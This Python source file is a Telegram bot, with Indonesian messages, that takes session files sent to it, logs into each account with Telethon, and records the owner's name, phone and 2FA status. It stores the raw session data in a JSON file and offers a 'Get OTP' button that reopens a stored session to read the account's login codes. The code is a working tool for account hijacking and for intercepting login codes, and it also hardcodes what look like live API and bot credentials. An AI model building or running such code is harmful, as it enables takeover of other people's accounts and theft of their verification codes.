import os
import asyncio
import time
import json
from datetime import datetime
from telethon.sync import TelegramClient
from telethon import events, Button
from telethon.tl.functions.users import GetFullUserRequest
from telethon.errors import SessionPasswordNeededError, PhoneNumberInvalidError
from telethon.tl.functions.messages import GetHistoryRequest

# Bot configuration - GANTI DENGAN INFORMASI ANDA
API_ID = 25649945  # Ganti dengan API ID Anda
API_HASH = "d91f3e307f5ee75e57136421f2c3adc6"  # Ganti dengan API Hash Anda
BOT_TOKEN = "7354445605:AAEyRju_l_T1y-tgHd4NgD-bVJseb3tGr_U"  # Ganti dengan Bot Token Anda
ADMIN_ID = 5988451717  # Ganti dengan ID Telegram Anda (admin)

# Create the bot
bot = TelegramClient('bot', API_ID, API_HASH).start(bot_token=BOT_TOKEN)

# Dictionary to track session files received from users
user_sessions = {}

# Dictionary to store active sessions
active_sessions = {}

# File to store active sessions
SESSIONS_FILE = "active_sessions.json"

# OTP Sender
OTP_SENDER = "+42777"

# Load saved sessions from file
def load_sessions():
    global active_sessions
    try:
        if os.path.exists(SESSIONS_FILE):
            with open(SESSIONS_FILE, 'r') as f:
                active_sessions = json.load(f)
    except Exception as e:
        print(f"Error loading sessions: {e}")
        active_sessions = {}

# Save sessions to file
def save_sessions():
    try:
        with open(SESSIONS_FILE, 'w') as f:
            json.dump(active_sessions, f)
    except Exception as e:
        print(f"Error saving sessions: {e}")

# Load sessions on startup
load_sessions()

@bot.on(events.NewMessage(pattern='/start'))
async def start(event):
    """Send a message when the command /start is issued."""
    await event.respond('Selamat datang di Session Checker Bot! Kirim file session Telegram untuk dicheck.')

@bot.on(events.NewMessage(pattern='/kelola'))
async def kelola(event):
    """Handle /kelola command to manage active sessions."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.respond("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Convert user_id to string for dictionary key
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and active_sessions[user_id_str]:
        # Create pagination for sessions
        await show_session_list(user_id, 0)
    else:
        await event.respond("Tidak ada session aktif yang tersimpan. Silakan check session terlebih dahulu.")

async def show_session_list(user_id, page=0):
    """Show paginated list of active sessions."""
    user_id_str = str(user_id)
    
    if user_id_str not in active_sessions or not active_sessions[user_id_str]:
        await bot.send_message(user_id, "Tidak ada session aktif yang tersimpan.")
        return
    
    # Get sessions for the user
    sessions = active_sessions[user_id_str]
    
    # Calculate pagination
    sessions_per_page = 5
    total_pages = (len(sessions) + sessions_per_page - 1) // sessions_per_page
    
    if page < 0:
        page = 0
    if page >= total_pages:
        page = total_pages - 1
    
    start_idx = page * sessions_per_page
    end_idx = min(start_idx + sessions_per_page, len(sessions))
    
    # Create message with session list
    message = "🔐 **DAFTAR SESSION AKTIF**\n\n"
    
    for i in range(start_idx, end_idx):
        session = sessions[i]
        message += f"{i+1}. **{session['first_name']}** (@{session['username'] or 'tidak ada'}) - `{session['phone']}`\n"
    
    message += f"\nHalaman {page+1}/{total_pages}"
    
    # Create buttons for pagination and actions
    buttons = []
    
    # Add session buttons
    session_buttons = []
    for i in range(start_idx, end_idx):
        session_buttons.append([Button.inline(f"🔹 {sessions[i]['first_name']} ({sessions[i]['phone']})", f"session_{i}")])
    
    # Add navigation buttons
    nav_buttons = []
    if page > 0:
        nav_buttons.append(Button.inline("⬅️ Sebelumnya", f"page_{page-1}"))
    if page < total_pages - 1:
        nav_buttons.append(Button.inline("Selanjutnya ➡️", f"page_{page+1}"))
    
    buttons = session_buttons
    if nav_buttons:
        buttons.append(nav_buttons)
    
    await bot.send_message(user_id, message, buttons=buttons)

@bot.on(events.CallbackQuery(data=lambda x: x.startswith(b"page_")))
async def handle_page_callback(event):
    """Handle pagination callbacks."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Get requested page
    page = int(event.data.decode().split("_")[1])
    
    # Show session list for that page
    await event.delete()
    await show_session_list(user_id, page)

@bot.on(events.CallbackQuery(data=lambda x: x.startswith(b"session_")))
async def handle_session_callback(event):
    """Handle session selection."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Get selected session index
    session_idx = int(event.data.decode().split("_")[1])
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
        session = active_sessions[user_id_str][session_idx]
        
        # Create action buttons for the session
        buttons = [
            [
                Button.inline("📲 Get OTP", f"otp_{session_idx}"),
                Button.inline("🗑️ Hapus", f"delete_{session_idx}")
            ],
            [Button.inline("⬅️ Kembali", b"back_to_list")]
        ]
        
        # Create session info message
        message = (
            f"✅ **DETAIL SESSION**\n\n"
            f"📱 **Nomor:** `{session.get('phone', 'Tidak diketahui')}`\n"
            f"👤 **Nama Depan:** `{session.get('first_name', 'Tidak diketahui')}`\n"
            f"👤 **Nama Belakang:** `{session.get('last_name', 'Tidak ada')}`\n"
            f"🔖 **Username:** `{session.get('username', 'Tidak ada')}`\n"
            f"🆔 **User ID:** `{session.get('user_id', 'Tidak diketahui')}`\n"
            f"📅 **Tanggal Pembuatan:** `{session.get('creation_date', 'Tidak diketahui')}`\n"
            f"🔐 **Premium:** `{session.get('is_premium', 'Tidak diketahui')}`\n"
            f"🔄 **2FA Aktif:** `{session.get('has_2fa', 'Tidak diketahui')}`\n"
        )
        
        await event.edit(message, buttons=buttons)
    else:
        await event.answer("Session tidak ditemukan.")

@bot.on(events.CallbackQuery(data=b"back_to_list"))
async def back_to_list(event):
    """Go back to the session list."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    await event.delete()
    await show_session_list(user_id, 0)

@bot.on(events.CallbackQuery(data=lambda x: x.startswith(b"otp_")))
async def get_otp(event):
    """Get OTP for the selected session."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Get selected session index
    session_idx = int(event.data.decode().split("_")[1])
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
        session = active_sessions[user_id_str][session_idx]
        
        # Create a status message
        status_msg = await event.respond("⏳ Sedang mencari OTP terbaru...")
        
        # Try to get OTP
        otp_result = await get_latest_otp(session)
        
        if otp_result['success']:
            await status_msg.edit(
                f"✅ **OTP DITEMUKAN**\n\n"
                f"📱 **Untuk:** `{session['phone']}`\n"
                f"🔢 **Kode OTP:** `{otp_result['otp']}`\n"
                f"⏰ **Waktu:** `{otp_result['time']}`\n\n"
                f"📤 **Pesan Lengkap:**\n`{otp_result['message']}`",
                buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
            )
        else:
            await status_msg.edit(
                f"❌ **OTP TIDAK DITEMUKAN**\n\n"
                f"Pesan: {otp_result['error']}",
                buttons=[Button.inline("⬅️ Kembali", f"session_{session_idx}")]
            )
    else:
        await event.answer("Session tidak ditemukan.")

@bot.on(events.CallbackQuery(data=lambda x: x.startswith(b"delete_")))
async def confirm_delete_session(event):
    """Confirm deletion of a session."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Get selected session index
    session_idx = int(event.data.decode().split("_")[1])
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
        session = active_sessions[user_id_str][session_idx]
        
        # Create confirmation buttons
        buttons = [
            [
                Button.inline("✅ Ya, Hapus", f"confirm_delete_{session_idx}"),
                Button.inline("❌ Batal", f"session_{session_idx}")
            ]
        ]
        
        await event.edit(
            f"⚠️ **KONFIRMASI HAPUS SESSION**\n\n"
            f"Apakah Anda yakin ingin menghapus session ini?\n\n"
            f"📱 **Nomor:** `{session['phone']}`\n"
            f"👤 **Nama:** `{session['first_name']}`\n"
            f"🔖 **Username:** `@{session['username'] or 'tidak ada'}`\n",
            buttons=buttons
        )
    else:
        await event.answer("Session tidak ditemukan.")

@bot.on(events.CallbackQuery(data=lambda x: x.startswith(b"confirm_delete_")))
async def delete_session(event):
    """Delete a session after confirmation."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.answer("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Get selected session index
    session_idx = int(event.data.decode().split("_")[2])
    user_id_str = str(user_id)
    
    if user_id_str in active_sessions and 0 <= session_idx < len(active_sessions[user_id_str]):
        # Get session info before removing
        session = active_sessions[user_id_str][session_idx]
        
        # Remove the session
        del active_sessions[user_id_str][session_idx]
        
        # Save updated sessions
        save_sessions()
        
        await event.edit(
            f"✅ **SESSION TELAH DIHAPUS**\n\n"
            f"Session untuk `{session['phone']}` (`{session['first_name']}`) telah dihapus.",
            buttons=[Button.inline("⬅️ Kembali ke Daftar", b"back_to_list")]
        )
    else:
        await event.answer("Session tidak ditemukan.")

async def get_latest_otp(session):
    """Get the latest OTP message from the session."""
    result = {'success': False, 'error': 'Error tidak diketahui'}
    
    try:
        # Create session file
        session_path = f"temp_session_{session['user_id']}"
        
        # Try to create a client with the saved session data
        if 'session_data' in session and session['session_data']:
            with open(session_path, 'wb') as f:
                f.write(bytes.fromhex(session['session_data']))
        else:
            result['error'] = "Data session tidak tersedia"
            return result
        
        # Connect to Telegram
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            # Look for messages from OTP sender
            entity = await client.get_entity(OTP_SENDER)
            
            # Get recent messages
            messages = await client(GetHistoryRequest(
                peer=entity,
                limit=5,
                offset_date=None,
                offset_id=0,
                max_id=0,
                min_id=0,
                add_offset=0,
                hash=0
            ))
            
            # Find OTP message
            otp_found = False
            for msg in messages.messages:
                if msg.message and any(word in msg.message.lower() for word in ['code', 'код', 'otp', 'kode']):
                    # Extract OTP (usually a 5-6 digit number)
                    import re
                    otp_match = re.search(r'\b\d{4,6}\b', msg.message)
                    
                    if otp_match:
                        otp_code = otp_match.group(0)
                        result = {
                            'success': True,
                            'otp': otp_code,
                            'message': msg.message,
                            'time': msg.date.strftime('%Y-%m-%d %H:%M:%S')
                        }
                        otp_found = True
                        break
            
            if not otp_found:
                result['error'] = "Tidak menemukan pesan OTP dari nomor +42777"
        else:
            result['error'] = "Session tidak terotorisasi"
        
        # Disconnect the client
        await client.disconnect()
    except Exception as e:
        result['error'] = str(e)
    
    # Clean up session file
    try:
        if os.path.exists(session_path):
            os.remove(session_path)
        if os.path.exists(session_path + '.session'):
            os.remove(session_path + '.session')
    except:
        pass
    
    return result

@bot.on(events.NewMessage(func=lambda e: e.is_private))
async def handle_message(event):
    """Handle incoming messages in private chats."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.respond("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    # Check if the message contains a document (file)
    if event.document:
        # Check if the file might be a session file
        file_name = event.file.name if hasattr(event.file, 'name') else "unknown_file"
        
        # Download the file
        download_path = f"temp_{file_name}"
        await event.download_media(file=download_path)
        
        # Save session information
        current_time = time.time()
        if user_id not in user_sessions:
            user_sessions[user_id] = []
        
        user_sessions[user_id].append({
            'path': download_path,
            'time': current_time,
            'message_id': event.id
        })
        
        # Schedule a function to check if no more files are sent within 15 seconds
        asyncio.create_task(check_for_button_prompt(user_id, current_time))

async def check_for_button_prompt(user_id, timestamp):
    """Check if no more files are sent within 15 seconds and prompt with a button."""
    await asyncio.sleep(15)  # Wait for 15 seconds
    
    # Check if this was the last file sent (no newer ones)
    is_last_file = True
    for session in user_sessions.get(user_id, []):
        if session['time'] > timestamp:
            is_last_file = False
            break
    
    if is_last_file and user_id in user_sessions and user_sessions[user_id]:
        # Send message with inline button
        buttons = [Button.inline("✅ Cek Session", b"check_sessions")]
        await bot.send_message(
            user_id, 
            "Anda telah mengirim file session. Klik tombol di bawah untuk memeriksa.",
            buttons=buttons
        )

@bot.on(events.CallbackQuery(data=b"check_sessions"))
async def check_sessions_callback(event):
    """Handle the callback when the Check Sessions button is pressed."""
    user_id = event.sender_id
    
    # Only allow admin to use the bot
    if user_id != ADMIN_ID:
        await event.respond("Maaf, hanya admin bot yang dapat menggunakan fitur ini.")
        return
    
    if user_id in user_sessions and user_sessions[user_id]:
        await event.answer("Memeriksa file session...")
        
        # Process each session file
        for session in user_sessions[user_id]:
            # Get the original message ID to reply to
            original_msg_id = session['message_id']
            file_path = session['path']
            
            # Send a processing message
            processing_msg = await bot.send_message(
                user_id, 
                f"⏳ Memproses file session...",
                reply_to=original_msg_id
            )
            
            # Check the session file
            result = await check_session_file(file_path)
            
            # Format and send results
            if result['valid']:
                # Format creation date if available
                creation_date = "Tidak diketahui"
                if 'creation_date' in result and result['creation_date']:
                    creation_date = result['creation_date'].strftime('%Y-%m-%d %H:%M:%S')
                
                # Store valid session
                user_id_str = str(user_id)
                if user_id_str not in active_sessions:
                    active_sessions[user_id_str] = []
                
                # Add to active sessions if not already exists
                session_exists = False
                for existing_session in active_sessions[user_id_str]:
                    if existing_session.get('user_id') == result.get('user_id'):
                        session_exists = True
                        break
                
                if not session_exists:
                    # Read session data
                    session_data = None
                    try:
                        with open(result['session_path'], 'rb') as f:
                            session_data = f.read().hex()
                    except:
                        pass
                    
                    # Add to active sessions
                    active_sessions[user_id_str].append({
                        'user_id': result.get('user_id'),
                        'first_name': result.get('first_name', 'Tidak diketahui'),
                        'last_name': result.get('last_name', 'Tidak ada'),
                        'username': result.get('username'),
                        'phone': result.get('phone', 'Tidak diketahui'),
                        'creation_date': creation_date,
                        'is_premium': result.get('is_premium', 'Tidak diketahui'),
                        'has_2fa': result.get('has_2fa', 'Tidak diketahui'),
                        'session_data': session_data
                    })
                    
                    # Save sessions
                    save_sessions()
                
                message = (
                    f"✅ **SESSION VALID**\n\n"
                    f"📱 **Nomor:** `{result.get('phone', 'Tidak diketahui')}`\n"
                    f"👤 **Nama Depan:** `{result.get('first_name', 'Tidak diketahui')}`\n"
                    f"👤 **Nama Belakang:** `{result.get('last_name', 'Tidak ada')}`\n"
                    f"🔖 **Username:** `{result.get('username', 'Tidak ada')}`\n"
                    f"🆔 **User ID:** `{result.get('user_id', 'Tidak diketahui')}`\n"
                    f"📅 **Tanggal Pembuatan:** `{creation_date}`\n"
                    f"🔐 **Premium:** `{result.get('is_premium', 'Tidak diketahui')}`\n"
                    f"🔄 **2FA Aktif:** `{result.get('has_2fa', 'Tidak diketahui')}`\n"
                )
            else:
                message = f"❌ **SESSION TIDAK VALID**\n\nError: {result.get('error', 'Error tidak diketahui')}"
            
            # Edit the processing message with the results
            await processing_msg.edit(message)
            
            # Clean up the session file
            try:
                os.remove(file_path)
            except:
                pass
        
        # Clear the session list for this user
        user_sessions[user_id] = []
    else:
        await event.answer("Tidak ada file session untuk diperiksa.")

async def check_session_file(file_path):
    """Check a session file and extract information from it."""
    result = {'valid': False}
    
    try:
        # Get the session file name without the temp_ prefix
        session_name = os.path.basename(file_path).replace('temp_', '')
        
        # Create a new path for the session
        session_path = session_name
        
        # Rename the file to correct session name if needed
        if file_path != session_path:
            os.rename(file_path, session_path)
        
        # Save the session path
        result['session_path'] = session_path
        
        # Try to create a client with the session
        client = TelegramClient(session_path, API_ID, API_HASH)
        await client.connect()
        
        if await client.is_user_authorized():
            result['valid'] = True
            
            # Get the current user info
            me = await client.get_me()
            full_user = await client(GetFullUserRequest(me.id))
            
            # Basic user info
            result['user_id'] = me.id
            result['first_name'] = me.first_name
            result['last_name'] = me.last_name
            result['username'] = me.username
            result['phone'] = me.phone
            result['is_premium'] = me.premium if hasattr(me, 'premium') else "Tidak diketahui"
            
            # Check if 2FA is enabled
            result['has_2fa'] = "Tidak dapat ditentukan"
            
            # Try to get creation date (estimation based on user ID)
            try:
                # This is a rough estimation, not 100% accurate
                timestamp = ((me.id >> 32) - 1420070400)
                if timestamp > 0:
                    result['creation_date'] = datetime.fromtimestamp(timestamp)
            except:
                result['creation_date'] = None
        else:
            result['error'] = "Session tidak terotorisasi"
        
        # Disconnect the client
        await client.disconnect()
    except SessionPasswordNeededError:
        result['error'] = "Password 2FA diperlukan"
        result['has_2fa'] = True
    except PhoneNumberInvalidError:
        result['error'] = "Nomor telepon dalam session tidak valid"
    except Exception as e:
        result['error'] = str(e)
    
    return result

print("Bot telah dijalankan...")
bot.run_until_disconnected()
